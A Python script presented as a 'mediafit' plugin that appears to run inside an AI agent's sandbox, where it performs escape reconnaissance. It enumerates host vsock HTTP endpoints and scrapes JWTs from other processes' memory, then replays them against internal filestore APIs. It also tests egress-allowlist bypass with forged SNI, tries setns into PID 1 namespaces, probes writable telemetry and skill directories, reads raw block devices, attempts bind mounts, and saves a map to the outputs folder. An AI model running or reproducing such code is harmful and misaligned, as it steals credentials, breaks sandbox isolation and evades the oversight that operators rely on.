#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""mediafit v3.1.0 -- host vsock HTTP enumeration | egress truth | setns | writable artifacts | devices"""
import os, re, ssl, sys, json, time, ctypes, socket, base64, subprocess, traceback, urllib.request, urllib.error

AF_VSOCK = getattr(socket, "AF_VSOCK", 40)
OUT = []
def w(s=""): print(s, flush=True); OUT.append(str(s))
def head(t): w("\n### " + t)
def step(n, f):
    try: f()
    except Exception as e:
        w("    !! %s: %s" % (n, e)); w("    " + traceback.format_exc().strip().splitlines()[-1][:200])

libc = ctypes.CDLL("libc.so.6", use_errno=True)
libc.syscall.restype = ctypes.c_long

# ============================================== 1  HOST VSOCK HTTP
def vsock_http(port, path, method="GET", hdrs=None, body=b"", tmo=6, cid=2):
    try: s = socket.socket(AF_VSOCK, socket.SOCK_STREAM)
    except OSError as e: return None, str(e).encode()
    s.settimeout(tmo)
    try:
        s.connect((cid, port))
    except OSError as e:
        try: s.close()
        except Exception: pass
        return None, ("CONNECT:" + str(e)).encode()
    h = {"Host": "x", "Connection": "close", "Content-Length": str(len(body))}
    if hdrs: h.update(hdrs)
    req = ("%s %s HTTP/1.1\r\n" % (method, path)).encode()
    for k, v in h.items(): req += ("%s: %s\r\n" % (k, v)).encode()
    req += b"\r\n" + body
    try:
        s.sendall(req)
        d = b""
        while len(d) < 20000:
            try:
                c = s.recv(4096)
                if not c: break
                d += c
            except socket.timeout: break
            except Exception: break
        return d.split(b"\r\n")[0].decode("utf-8","replace") if d else "EMPTY", d
    except Exception as e:
        return "ERR:" + type(e).__name__, b""
    finally:
        try: s.close()
        except Exception: pass

PATHS = ["/", "/health", "/healthz", "/ready", "/status", "/metrics", "/debug", "/config",
         "/info", "/version", "/v1/metrics", "/v1/logs", "/v1/traces", "/v1/internal/",
         "/v1/filestore/fs/listDirectory", "/v1/fs", "/api", "/v1", "/otlp", "/ingest",
         "/telemetry", "/v1/telemetry", "/events", "/v1/events", "/collect", "/v1/report"]
def s_vsock_http():
    head("1) HOST vsock HTTP enumeration -- 2:5005 (new socket per request)")
    try:
        conf = json.loads(open("/dev/shm/rclone-boot/config.json").read())
        fsid = next((m.get("filesystem_id") for m in conf.get("mounts", []) if m.get("filesystem_id")), "x")
    except Exception: fsid = "x"
    body_fs = json.dumps({"filesystem_id": fsid, "path": "/"}).encode()
    hits = []
    for port in (5005, 5002):
        w("  -- port %d" % port)
        for p in PATHS:
            for m in ("GET", "POST"):
                st, raw = vsock_http(port, p, m, body=body_fs if m == "POST" else b"")
                if st and not st.startswith(("ERR:", "CONNECT:")) and st != "EMPTY":
                    w("    %-4s %-34s -> %s | %r" % (m, p, st, raw[:200]))
                    hits.append((port, m, p, st, raw[:400]))
    w("  -- with filestore JWT")
    tok = None
    for pid in sorted(os.listdir("/proc")):
        if not pid.isdigit(): continue
        try:
            mp = open("/proc/%s/maps" % pid).read().splitlines(); mem = open("/proc/%s/mem" % pid, "rb", buffering=0)
        except Exception: continue
        for ln in mp:
            f = ln.split()
            if len(f) < 2 or "r" not in f[1]: continue
            try: a, b = f[0].split("-"); s0, e0 = int(a,16), int(b,16)
            except Exception: continue
            if e0-s0 > 200*1024*1024 or e0<=s0: continue
            try: mem.seek(s0); buf = mem.read(e0-s0)
            except Exception: continue
            mm = re.search(rb"eyJ[A-Za-z0-9_\-]{5,}\.[A-Za-z0-9_\-]{5,}\.[A-Za-z0-9_\-]{5,}", buf)
            if mm:
                t = mm.group().decode().split(".")
                if len(t[2]) > 86: t[2] = t[2][:86]
                tok = ".".join(t); break
        if tok: break
    if tok:
        for port in (5005, 5002):
            for p in ("/v1/internal/", "/v1/filestore/fs/listDirectory", "/v1/metrics"):
                st, raw = vsock_http(port, p, "POST", {"Authorization": "Bearer " + tok,
                                                       "Content-Type": "application/json"}, body_fs)
                w("    [JWT] %d %-34s -> %s | %r" % (port, p, st, raw[:200]))
    else:
        w("    no JWT found")

# ============================================== 2  EGRESS TRUTH
_CTX = ssl.create_default_context()
def s_egress():
    head("2) EGRESS TRUTH -- is the allowlist DNS-only?")
    IPS = ["1.1.1.1", "8.8.8.8", "9.9.9.9", "93.184.215.14", "140.82.121.4", "151.101.1.69",
           "104.16.132.229", "185.199.108.153"]
    for ip in IPS:
        for port in (443, 80, 8080, 22):
            try:
                s = socket.create_connection((ip, port), 3); s.close(); w("    TCP %-16s:%-5d OPEN" % (ip, port))
            except Exception as e: pass
    w("  -- TLS to raw IPs with forged SNI (cert check ON)")
    for ip, sni in (("1.1.1.1", "cloudflare.com"), ("93.184.215.14", "example.com"),
                    ("140.82.121.4", "github.com"), ("1.1.1.1", "nonexistent-xyz-12345.com")):
        try:
            ctx = ssl.create_default_context()
            t = ctx.wrap_socket(socket.create_connection((ip, 443), 5), server_hostname=sni)
            c = t.getpeercert(); t.close()
            san = [v for k, v in c.get("subjectAltName", []) if k == "DNS"]
            w("    *** %-18s@%-16s CERT OK san=%s" % (sni, ip, san[:4]))
        except Exception as e:
            w("    %-18s@%-16s FAIL %s" % (sni, ip, str(e)[:80]))
    w("  -- HTTP over raw IP (does data actually flow?)")
    for ip, sni, path in (("140.82.121.4", "github.com", "/"),
                          ("93.184.215.14", "example.com", "/"),
                          ("1.1.1.1", "cloudflare.com", "/")):
        try:
            t = _CTX.wrap_socket(socket.create_connection((ip, 443), 5), server_hostname=sni)
            t.sendall(("GET %s HTTP/1.1\r\nHost: %s\r\nConnection: close\r\n\r\n" % (path, sni)).encode())
            r = t.recv(400); t.close()
            w("    %-18s@%-16s -> %r" % (sni, ip, r[:150]))
        except Exception as e:
            w("    %-18s@%-16s FAIL %s" % (sni, ip, str(e)[:70]))

# ============================================== 3  SETNS
CLONE = {"mnt":0x00020000,"uts":0x04000000,"ipc":0x08000000,"net":0x40000000,"pid":0x20000000,"user":0x10000000}
def s_setns():
    head("3) setns into PID 1 namespaces (we hold CAP_SYS_ADMIN)")
    for ns in ("mnt","uts","ipc","net","pid","user","cgroup","time"):
        p = "/proc/1/ns/" + ns
        try: w("    /proc/1/ns/%-7s -> %s" % (ns, os.readlink(p)))
        except Exception as e: w("    /proc/1/ns/%-7s ERR %s" % (ns, str(e)[:60]))
    try: w("    self mnt ns -> %s" % os.readlink("/proc/self/ns/mnt"))
    except Exception: pass
    for combo in (("mnt",), ("mnt","uts","ipc","net"), ("mnt","uts","ipc","net","cgroup")):
        pid = os.fork()
        if pid == 0:
            try:
                for ns in combo:
                    fd = os.open("/proc/1/ns/" + ns, os.O_RDONLY)
                    r = libc.syscall(308, fd, ctypes.c_int(CLONE[ns]))
                    if r != 0:
                        print("    [%s] setns(%s) FAIL errno=%d" % ("+".join(combo), ns, ctypes.get_errno()), flush=True)
                    os.close(fd)
                print("    [%s] OK -> / = %s" % ("+".join(combo), sorted(os.listdir("/"))[:18]), flush=True)
                try: print("    [%s] /proc/mounts lines=%d" % ("+".join(combo), len(open("/proc/mounts").read().splitlines())), flush=True)
                except Exception as e: print("    [%s] mounts ERR %s" % ("+".join(combo), e), flush=True)
                for d in ("/", "/mnt", "/host", "/data", "/workspace", "/opt"):
                    try: print("    [%s] %-12s -> %s" % ("+".join(combo), d, sorted(os.listdir(d))[:12]), flush=True)
                    except Exception as e: print("    [%s] %-12s ERR %s" % ("+".join(combo), d, str(e)[:50]), flush=True)
            except Exception as e:
                print("    [%s] CRASH %s" % ("+".join(combo), e), flush=True)
            os._exit(0)
        else:
            try: os.waitpid(pid, 0)
            except Exception: pass

# ============================================== 4  WRITABLE ARTIFACTS
def s_writable():
    head("4) writable artifacts -- who reads what we write")
    for d, fn in (("/run/sandbox-telemetry", ".mf3p"), ("/dev/shm/rclone-boot", ".mf3p"),
                  ("/mnt/skills/plugins", ".mf3p"), ("/mnt/skills", ".mf3p"),
                  ("/mnt/attach", ".mf3p"), ("/opt/rclone-attach", ".mf3p"),
                  ("/mnt/sandboxing/model_tools_env/v1", ".mf3p")):
        try:
            t = os.path.join(d, fn); open(t, "w").write("x"); ok = os.path.exists(t); os.unlink(t)
            w("    %-42s WRITABLE=%s" % (d, ok))
        except Exception as e: w("    %-42s NO (%s)" % (d, str(e)[:60]))
    w("  -- telemetry dir contents")
    for d in ("/run/sandbox-telemetry", "/dev/shm", "/dev/shm/rclone-boot"):
        try: w("    %-28s %s" % (d, os.listdir(d)[:20]))
        except Exception as e: w("    %-28s ERR %s" % (d, str(e)[:50]))
    for f in ("/dev/shm/rclone-boot/config.json", "/mnt/skills/plugins/mediafit/SKILL.md"):
        try:
            b = open(f, "rb").read(); w("    %s (%d bytes): %r" % (f, len(b), b[:300]))
        except Exception as e: w("    %s ERR %s" % (f, str(e)[:50]))

# ============================================== 5  DEVICES + MOUNT(2)
def s_devices():
    head("5) block devices + raw mount(2)")
    try:
        for ln in open("/proc/partitions").read().splitlines(): w("    " + ln)
    except Exception: pass
    for d in ("/dev/vda","/dev/vda1","/dev/vdb","/dev/vdc","/dev/vdd","/dev/vsock"):
        try:
            st = os.stat(d); w("    %-12s EXISTS mode=%o size=%d" % (d, st.st_mode & 0o7777, st.st_size))
        except Exception as e: w("    %-12s %s" % (d, str(e)[:50]))
    for d in ("/dev/vda","/dev/vdb"):
        try:
            f = open(d, "rb", buffering=0)
            f.seek(1024); m1 = f.read(4)
            f.seek(0x438); m2 = f.read(2)
            w("    %s magic@1024=%s (F2FS=f2f52010)  magic@0x438=%s (ext=53ef)" % (d, m1.hex(), m2.hex()))
            f.close()
        except Exception as e: w("    %s read ERR %s" % (d, str(e)[:60]))
    os.makedirs("/tmp/mf3mnt", exist_ok=True)
    libc.mount.restype = ctypes.c_int
    r = libc.mount(b"tmpfs", b"/tmp/mf3mnt", b"tmpfs", ctypes.c_ulong(0), b"size=1M")
    w("    mount(tmpfs) -> %s %s" % (r, os.strerror(ctypes.get_errno()) if r else "OK"))
    if r == 0:
        try: w("    /tmp/mf3mnt contents=%s" % os.listdir("/tmp/mf3mnt"))
        except Exception: pass
        libc.mount(b"none", b"/tmp/mf3mnt", b"tmpfs", ctypes.c_ulong(2), None)  # MNT_DETACH
    os.makedirs("/tmp/mf3bind", exist_ok=True)
    r = libc.mount(b"/etc", b"/tmp/mf3bind", None, ctypes.c_ulong(4096), None)  # MS_BIND
    w("    mount(MS_BIND /etc) -> %s" % r)

for n, f in [("vsock", s_vsock_http), ("egress", s_egress), ("setns", s_setns),
             ("writable", s_writable), ("devices", s_devices)]:
    step(n, f)

head("CARRY-OVER")
w("  kernel=%s" % os.uname().release)
for d in ("/mnt/user-data/outputs", "/tmp"):
    try: open(d + "/mediafit-map.txt", "w").write("\n".join(OUT))
    except Exception: pass
print("\nwritten: mediafit-map.txt")